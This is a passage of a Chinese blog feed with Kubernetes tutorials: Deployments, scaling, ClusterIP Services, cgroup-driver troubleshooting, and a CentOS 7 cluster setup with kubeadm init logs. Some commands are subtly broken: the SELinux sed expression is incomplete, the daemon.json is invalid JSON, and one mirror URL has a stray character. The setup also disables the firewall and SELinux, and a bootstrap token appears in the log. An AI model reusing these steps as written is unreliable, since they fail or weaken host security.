Deployment</h4><p>在了解了上面的RC后，在看Deployment就知道是干什么的了。Deployment是Kubernetes提供的一中更加<strong>简单地</strong>更新RC和Pod的机制。</p><p>官方对Deploment的解释如下（附渣渣理解）：</p><blockquote><p>A <em>Deployment</em> provides declarative updates for Pods andReplicaSets.</p><p>You describe a <em>desired state</em> in a Deployment, and theDeployment Controller changes the actual state to the desired state at acontrolled rate. You can define Deployments to create new ReplicaSets,or to remove existing Deployments and adopt all their resources with newDeployments.</p><blockquote><p>一个Deployment提供了一个方法--可以用来为pods和ReplicaSets进行更新升级</p><p>你只需要在<em>Deployment</em>中声明你想要的状态，然后就交给Deployment就行了，它会自动以受控的速率将现有的状态转变为期待的状态。你可以声明<em>Deployment</em>来创建新的ReplicaSets，或者删除现有的<em>Deployment</em>并通过新的<em>Deployment</em>收取其资源。</p></blockquote></blockquote><p>官方说明典型的使用Deployment场景如下：</p><ul><li>创建Deployment来上线ReplicaSets(which官方不建议用户手动创建or管理)</li><li>通过更新Deployment中的PodTemplateSpec字段来声明Pod的<strong>新状态</strong></li><li>可以使用Deployment进行回滚</li><li>可以扩大Deployment来承担更多负载</li><li>可以使用Deployment来判断上线过程是否出现停滞</li><li>可以使用Deployment来清理较旧的ReplicaSet</li></ul><h5 id="从一个deployment-demo开始">从一个Deployment Demo开始</h5><p>下面我们创建一个nginx的deployment：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx-deployment-demo</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>然后直接部署到集群中：</p><blockquote><p>kubectl apply -f nginx-deployment-demo.yaml</p></blockquote><p>你也可以使用命令来完成：</p><blockquote><p>kubectl create deploy nginx-deployment --image=nginx --replicas=3</p></blockquote><p>创建成功后，我们可以查看deployment资源的状态以及创建的pod信息： <imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210907202007096.png"alt="image-20210907202007096" /></p><p>最终状态如下： <imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210907202059726.png"alt="image-20210907202059726" /></p><h5 id="deployment的扩容和缩容">Deployment的扩容和缩容</h5><p>虽然可以通过修改yaml文件并重新应用，但是相较麻烦，所以这里只记录使用命令如何进行扩容和缩容。</p><p>命令非常简单：</p><ul><li>扩容：<code>kubectl scale deploy nginx-deployment  --replicas=5</code>-&gt; 将当前副本数扩展到5个</li><li>缩容：<code>kubectl scale deploy nginx-deployment --replicas=2</code>-&gt;将当前副本数缩小到2个。(注意缩小到0只是副本为0个而不是删除了deployment)</li></ul><h4 id="kind-service">kind: Service</h4><p>上面RC也说到了，Pod副本是由RC来控制的，是变化的资源，且在滚动更新、伸缩的时候也会带来一些问题，因为访问者需要能够发现这个副本且能感知到其发生的变化。</p><p>Services即服务，它用于是K8s中一个抽象的概念，具体来说，它定义了一个Pod的逻辑集合以及访问他们的策略，和RC类似，Service和Pod之间的关联也是通过Label来完成的，<strong>Service的目标是提供一种桥梁，来为访问者提供一个固定的访问地址，用来在访问时重定向到相应的后端。--即代理的角色。</strong>Service的定义中重要元素和上面都类似，这里不赘述。</p><p>下面我们首先创建一个Deployment，镜像为nginx，包含两个副本： <imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210907205706951-16319558682421.png"alt="image-20210907205706951" /></p><p>这个时候你只能在node01上访问他自己的(10.10.12.32)上的nginx服务(80端口)，但是你不能从master亦或是node02上访问到，所以我们需要service来代理这些pod：</p><blockquote><p>kubectl create service clusterip nginx-deployment --tcp=8080:80</p></blockquote><p>这里注意，我们的deployment名称为<code>nginx-deployment</code>，所以我们的clusterip后面跟的名称要一致，然后我们来看一下详情：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210907210107159.png"alt="image-20210907210107159" /><figcaption aria-hidden="true">image-20210907210107159</figcaption></figure><p>可以看到服务的地址是<code>10.10.11.51</code>，代理的pod地址就是上面那两个，这时我们直接访问这个服务地址的8080即可访问到pod的80端口：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210907210433488.png"alt="image-20210907210433488" /><figcaption aria-hidden="true">image-20210907210433488</figcaption></figure><h2 id="结语">结语</h2><p><strong>K8s包含的内容还是不少的，关于K8sService的服务发现我会单独整理一篇。下一篇可能会就部署一个SpringCloud应用来讨论细节，学习如何将分布式应用部署到k8s中去。</strong></p><h2 id="出现的问题以及解决办法">出现的问题以及解决办法</h2><h3id="response-from-daemon-cgroup-parent-for-systemd-cgroup-should-be-a-valid-slice-named-as-xxx.slice">responsefrom daemon: cgroup-parent for systemd cgroup should be a valid slicenamed as "xxx.slice"</h3><p>这是因为你的docker和kubelet配置的cgroup政策不同，虽然我的kubernetes(v.1.21.3)最开始自己定义的是这样的：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210812140223916.png"alt="image-20210812140223916" /><figcaption aria-hidden="true">image-20210812140223916</figcaption></figure><p>但是Kubernetes官方建议docker使用systemd的方式，所以这里我们需要把docker和kubernetes的cgroupDriver都改为systemd方式：</p><ul><li><p>/var/lib/kubelet/config.yaml <imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210812140307970.png"alt="image-20210812140307970" /></p></li><li><p>/etc/docker/daemon.json <imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210812140420930.png"alt="image-20210812140420930" /></p></li></ul><blockquote><p>最后记得执行systemctl daemon-reload &amp;&amp; systemctl restartdocker &amp;&amp; systemctl restart kubelet来生效、重启</p></blockquote><p>这样就没有问题了。</p><h3id="log命令出现error-a-container-name-must-be-specified-for-pod-pod-demo-choose-one-of-xxx-xxxx-...">log命令出现error:a container name must be specified for pod pod-demo, choose one of: [xxxxxxx ...]</h3><p>这是因为你的pod里配置了多个container，所以在使用log命令的时候需要指定要查看的容器具体是哪一个，比如你要查看A容器的日志，那就是<code>kubectl logs [pod name] -c [container name]</code>。或者使用--all-containers参数查看全部容器。</p><h2 id="参考学习">参考学习</h2><p>《Kubernetes实战》 - 吴龙辉 著</p><p>《Kubernetes权威指南：从Docker到Kubernetes实践全接触（第二版）》-龚正等 著</p><p><ahref="https://zhuanlan.zhihu.com/p/115903242">k8s中的所有api-resources类型简介- 知乎</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;上一篇中我搭建了一个单master+三个从节点的Kubernetes集群，并直接使用nginx镜像进行了简单部署。这一篇来主要学习一下Kubernetes最主要的功能--容器编排。本篇将记录容器编排的重要概念、配置文件如何辨写开始，最后展示一个很简单的Hello-world。下一篇将深入实战，部署一个SpringCloud项目。&lt;/p&gt;
&lt;figure&gt;
&lt;img
src=&quot;/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png&quot;
alt=&quot;image-20210810183438958&quot; /&gt;
&lt;figcaption aria-hidden=&quot;true&quot;&gt;image-20210810183438958&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="分布式技术" scheme="https://lzwgiter.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"/>
    
    <category term="Kubernete" scheme="https://lzwgiter.github.io/tags/Kubernete/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes 集群环境搭建使用及问题记录（一）</title>
    <link href="https://lzwgiter.github.io/posts/eed4a979.html"/>
    <id>https://lzwgiter.github.io/posts/eed4a979.html</id>
    <published>2021-08-03T09:41:13.000Z</published>
    <updated>2021-10-29T07:55:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇将搭建一个单master节点的集群(后续补多master)并测试其可用性。整体上过程不是很复杂，就是中间几个报错耗点时间，所有我搭建中出现的问题也有记录</p><p>本文操作系统Centos7；kubernetes版本：v1.21.3；docker版本：20.10.7。</p><p><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（一）/components-of-kubernetes.png" /></p></blockquote><span id="more"></span><h1id="安装一个单master节点的kubernetes集群">安装一个单Master节点的Kubernetes集群</h1><h2 id="大体流程">大体流程</h2><ul><li>第一步：安装三台虚拟机（本文选择Centos 7最小安装）</li><li>对每一个虚拟机进行配置操作（关闭SELinux、关闭防火墙、关闭swap、配置hosts信息、配置静态IP、配置软件源）</li><li>在三个节点上装docker、kubelet、kubeadm、kubectl并进行配置（配置docker、kubernetes为阿里源）</li><li>在master节点上使用kubeadm方式进行初始化并执行相关操作</li><li>各个node节点加入集群</li><li>配置网络组件（本文使用<ahref="https://github.com/flannel-io/flannel#flannel">flannel</a>）</li><li>通过建立一个nginx的pod来测试集群</li></ul><h2 id="准备工作">准备工作</h2><h3 id="基本工作">基本工作</h3><p>首先安装三台Linux机器，这个没啥要求，我这里是Centos7下面对每一台机器进行以下处理：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 更换软件源</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 备份</span></span></span><br><span class="line">cp -a /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 更换为华为源</span></span></span><br><span class="line">sed -i &quot;s/#baseurl/baseurl/g&quot; /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">sed -i &quot;s/mirrorlist=http/#mirrorlist=http/g&quot; /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">sed -i &quot;s@http://mirror.centos.org@https://repo.huaweicloud.com@g&quot; /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 清除缓存并更新</span></span></span><br><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 永久关闭selinux</span></span><br><span class="line">sed -i &#x27;s/enforcing/disabled&#x27; /etc/selinux/config</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 关闭swap</span></span><br><span class="line">swapoff -a # 临时</span><br><span class="line">sed -ri &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. 设置主机名</span></span><br><span class="line">hostnamectl set-hostname &lt;hostname&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 为每一台机器添加hosts，比如我的环境：/etc/hosts</span></span><br><span class="line">10.10.10.101 k8s-master01</span><br><span class="line">10.10.10.102 k8s-node01</span><br><span class="line">10.10.10.103 k8s-node02</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 将IPv4流量传递到iptables</span></span><br><span class="line">cat &gt; /etc/sysctl.d/k8s.conf &lt;&lt; EOF</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生效</span></span><br><span class="line">sysctl --system</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 同步时间</span></span><br><span class="line">yum install ntpdate -y</span><br><span class="line">ntpdate time.windows.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9. 安装docker</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装必要系统工具</span></span></span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 添加软件源信息(阿里源)</span></span></span><br><span class="line">wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors。aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装Docker并启动、设置自启</span></span></span><br><span class="line">yum install docker-ce</span><br><span class="line">systemctl start docker &amp;&amp; systemctl enable docker</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10. 安装kubernetes</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 添加软件源信息</span></span></span><br><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装kubelet、kubeadm、kubectl，并设置自启(暂时不需要启动)</span></span></span><br><span class="line">yum install -y kubelet kubeadm kubectl</span><br><span class="line">systemctl enable kubelet</span><br></pre></td></tr></table></figure><h3 id="配置工作">配置工作</h3><p>主要是配置Docker镜像加速器，这个建议自己去阿里云注册账号，然后去控制台里看自己的镜像加速器地址。<strong>注意，也需要吧docker的cgroupdriver修改为systemd形式，与k8s保持一致。(不然后续会报错)</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="初始化master节点">初始化master节点</h2><p>我的初始化命令如下，<strong>注意，这是在master机器上，node节点时无需init的，后面直接join就行了。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address=10.10.10.101 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.3 --service-cidr=10.10.11.0/24 --pod-network-cidr=10.10.12.0/24</span><br></pre></td></tr></table></figure><p>其中每一个参数含义如下：</p><ul><li><code>apiserver-advertise-address</code>：本节点的IP</li><li><code>image-repository</code>：镜像地址，就用阿里云的就行了</li><li><code>kubernetes-version</code>：Kubernetes的版本号，用kubelet--version就能看到</li><li><code>service-cidr</code>：服务的CIDR网段</li><li><code>pod-network-cidr</code>：pod节点之间互通的的CIDR网段</li></ul><p>终端输入记录如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubeadm init --apiserver-advertise-address=10.10.10.101 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.3 --service-cidr=10.10.11.0/24 --pod-network-cidr=10.10.12.0/24</span><br><span class="line">[init] Using Kubernetes version: v1.21.3</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING IsDockerSystemdCheck]: detected &quot;cgroupfs&quot; as the Docker cgroup driver. The recommended driver is &quot;systemd&quot;. Please follow the guide at https://kubernetes.io/docs/setup/cri/</span><br><span class="line">[preflight] Pulling images required for setting up a Kubernetes cluster</span><br><span class="line">[preflight] This might take a minute or two, depending on the speed of your internet connection</span><br><span class="line">[preflight] You can also perform this action in beforehand using &#x27;kubeadm config images pull&#x27;</span><br><span class="line">error execution phase preflight: [preflight] Some fatal errors occurred:</span><br><span class="line">        [ERROR ImagePull]: failed to pull image registry.aliyuncs.com/google_containers/coredns:v1.8.0: output: Error response from daemon: manifest for registry.aliyuncs.com/google_containers/coredns:v1.8.0 not found: manifest unknown: manifest unknown</span><br><span class="line">, error: exit status 1</span><br><span class="line">[preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...`</span><br><span class="line">To see the stack trace of this error execute with --v=5 or higher</span><br><span class="line">[root@k8s-master01 ~]# docker pull registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line">1.8.0: Pulling from google_containers/coredns</span><br><span class="line">c6568d217a00: Pull complete</span><br><span class="line">5984b6d55edf: Pull complete</span><br><span class="line">Digest: sha256:cc8fb77bc2a0541949d1d9320a641b82fd392b0d3d8145469ca4709ae769980e</span><br><span class="line">Status: Downloaded newer image for registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line">registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# docker images</span><br><span class="line">REPOSITORY                                                        TAG        IMAGE ID       CREATED         SIZE</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-apiserver            v1.21.3    3d174f00aa39   2 weeks ago     126MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-scheduler            v1.21.3    6be0dc1302e3   2 weeks ago     50.6MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-controller-manager   v1.21.3    bc2bb319a703   2 weeks ago     120MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-proxy                v1.21.3    adb2816ea823   2 weeks ago     103MB</span><br><span class="line">registry.aliyuncs.com/google_containers/pause                     3.4.1      0f8457a4c2ec   6 months ago    683kB</span><br><span class="line">registry.aliyuncs.com/google_containers/coredns                   1.8.0      296a6d5035e2   9 months ago    42.5MB</span><br><span class="line">registry.aliyuncs.com/google_containers/etcd                      3.4.13-0   0369cf4303ff   11 months ago   253MB</span><br><span class="line"></span><br><span class="line">[root@k8s-master01 ~]# docker tag registry.aliyuncs.com/google_containers/coredns:1.8.0 registry.aliyuncs.com/google_containers/coredns:v1.8.0</span><br><span class="line">[root@k8s-master01 ~]# docker rmi registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line">Untagged: registry.aliyuncs.com/google_containers/coredns:1.8.0</span><br><span class="line">[root@k8s-master01 ~]# docker images</span><br><span class="line">REPOSITORY                                                        TAG        IMAGE ID       CREATED         SIZE</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-apiserver            v1.21.3    3d174f00aa39   2 weeks ago     126MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-scheduler            v1.21.3    6be0dc1302e3   2 weeks ago     50.6MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-proxy                v1.21.3    adb2816ea823   2 weeks ago     103MB</span><br><span class="line">registry.aliyuncs.com/google_containers/kube-controller-manager   v1.21.3    bc2bb319a703   2 weeks ago     120MB</span><br><span class="line">registry.aliyuncs.com/google_containers/pause                     3.4.1      0f8457a4c2ec   6 months ago    683kB</span><br><span class="line">registry.aliyuncs.com/google_containers/coredns                   v1.8.0     296a6d5035e2   9 months ago    42.5MB</span><br><span class="line">registry.aliyuncs.com/google_containers/etcd                      3.4.13-0   0369cf4303ff   11 months ago   253MB</span><br><span class="line">[root@k8s-master01 ~]# kubeadm init --apiserver-advertise-address=10.10.10.101 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.3 --service-cidr=10.10.11.0/24 --pod-network-cidr=10.10.12.0/24</span><br><span class="line">[init] Using Kubernetes version: v1.21.3</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING IsDockerSystemdCheck]: detected &quot;cgroupfs&quot; as the Docker cgroup driver. The recommended driver is &quot;systemd&quot;. Please follow the guide at https://kubernetes.io/docs/setup/cri/</span><br><span class="line">[preflight] Pulling images required for setting up a Kubernetes cluster</span><br><span class="line">[preflight] This might take a minute or two, depending on the speed of your internet connection</span><br><span class="line">[preflight] You can also perform this action in beforehand using &#x27;kubeadm config images pull&#x27;</span><br><span class="line">[certs] Using certificateDir folder &quot;/etc/kubernetes/pki&quot;</span><br><span class="line">[certs] Generating &quot;ca&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;apiserver&quot; certificate and key</span><br><span class="line">[certs] apiserver serving cert is signed for DNS names [k8s-master01 kubernetes kubernetes.default kubernetes.default.svc kubernetes.default.svc.cluster.local] and IPs [10.10.11.1 10.10.10.101]</span><br><span class="line">[certs] Generating &quot;apiserver-kubelet-client&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;front-proxy-ca&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;front-proxy-client&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;etcd/ca&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;etcd/server&quot; certificate and key</span><br><span class="line">[certs] etcd/server serving cert is signed for DNS names [k8s-master01 localhost] and IPs [10.10.10.101 127.0.0.1 ::1]</span><br><span class="line">[certs] Generating &quot;etcd/peer&quot; certificate and key</span><br><span class="line">[certs] etcd/peer serving cert is signed for DNS names [k8s-master01 localhost] and IPs [10.10.10.101 127.0.0.1 ::1]</span><br><span class="line">[certs] Generating &quot;etcd/healthcheck-client&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;apiserver-etcd-client&quot; certificate and key</span><br><span class="line">[certs] Generating &quot;sa&quot; key and public key</span><br><span class="line">[kubeconfig] Using kubeconfig folder &quot;/etc/kubernetes&quot;</span><br><span class="line">[kubeconfig] Writing &quot;admin.conf&quot; kubeconfig file</span><br><span class="line">[kubeconfig] Writing &quot;kubelet.conf&quot; kubeconfig file</span><br><span class="line">[kubeconfig] Writing &quot;controller-manager.conf&quot; kubeconfig file</span><br><span class="line">[kubeconfig] Writing &quot;scheduler.conf&quot; kubeconfig file</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file &quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file &quot;/var/lib/kubelet/config.yaml&quot;</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[control-plane] Using manifest folder &quot;/etc/kubernetes/manifests&quot;</span><br><span class="line">[control-plane] Creating static Pod manifest for &quot;kube-apiserver&quot;</span><br><span class="line">[control-plane] Creating static Pod manifest for &quot;kube-controller-manager&quot;</span><br><span class="line">[control-plane] Creating static Pod manifest for &quot;kube-scheduler&quot;</span><br><span class="line">[etcd] Creating static Pod manifest for local etcd in &quot;/etc/kubernetes/manifests&quot;</span><br><span class="line">[wait-control-plane] Waiting for the kubelet to boot up the control plane as static Pods from directory &quot;/etc/kubernetes/manifests&quot;. This can take up to 4m0s</span><br><span class="line">[apiclient] All control plane components are healthy after 28.122070 seconds</span><br><span class="line">[upload-config] Storing the configuration used in ConfigMap &quot;kubeadm-config&quot; in the &quot;kube-system&quot; Namespace</span><br><span class="line">[kubelet] Creating a ConfigMap &quot;kubelet-config-1.21&quot; in namespace kube-system with the configuration for the kubelets in the cluster</span><br><span class="line">[upload-certs] Skipping phase. Please see --upload-certs</span><br><span class="line">[mark-control-plane] Marking the node k8s-master01 as control-plane by adding the labels: [node-role.kubernetes.io/master(deprecated) node-role.kubernetes.io/control-plane node.kubernetes.io/exclude-from-external-load-balancers]</span><br><span class="line">[mark-control-plane] Marking the node k8s-master01 as control-plane by adding the taints [node-role.kubernetes.io/master:NoSchedule]</span><br><span class="line">[bootstrap-token] Using token: 42umpk.lqtmjnryhec3oj4f</span><br><span class="line">[bootstrap-token] Configuring bootstrap tokens, cluster-info ConfigMap, RBAC 